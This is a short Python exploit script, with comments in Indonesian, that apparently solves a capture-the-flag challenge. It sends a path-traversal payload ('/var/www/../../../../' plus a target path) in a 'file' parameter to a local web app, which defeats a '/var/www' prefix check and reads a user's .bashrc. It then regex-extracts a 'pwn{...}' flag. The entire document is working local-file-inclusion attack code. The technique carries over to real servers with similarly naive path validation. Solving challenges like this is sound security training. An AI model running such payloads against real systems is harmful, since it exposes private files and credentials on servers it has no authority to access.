#!/usr/bin/env python3
import requests
import re

# Target URL
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Berdasarkan hasil recon kita (grep via docker),
    # Flag tersimpan di dalam file konfigurasi shell bash milik user denji.
    target_file = "/home/denji/.bashrc"
    
    # Payload LFI:
    # Bypass validasi '/var/www' dengan path traversal
    payload = f"/var/www/../../../../{target_file}"
    
    print(f"[*] Sending Payload to retrieve: {target_file}")
    
    try:
        # Kirim Request
        r = requests.get(URL, params={'file': payload})
        
        if r.status_code == 200:
            print("[+] Injection Successful! File content retrieved.")
            
            # Ambil konten file dari dalam tag <pre>
            content_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            
            if content_match:
                content = content_match.group(1).strip()
                
                # Cari flag dengan regex pwn{...}
                flag_match = re.search(r'pwn\{.*?\}', content)
                
                if flag_match:
                    print("-" * 40)
                    print(f"[+] Raw Line found in .bashrc:")
                    # Print baris yang mengandung flag buat bukti
                    for line in content.splitlines():
                        if "pwn{" in line:
                            print(f"    {line.strip()}")
                    print("-" * 40)
                    print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}\n")
                else:
                    print("[-] File opened, but FLAG pattern not found.")
                    print("Raw Content excerpt:")
                    print(content[:200])
            else:
                print("[-] Could not parse <pre> content.")
        else:
            print(f"[-] HTTP Error: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit()
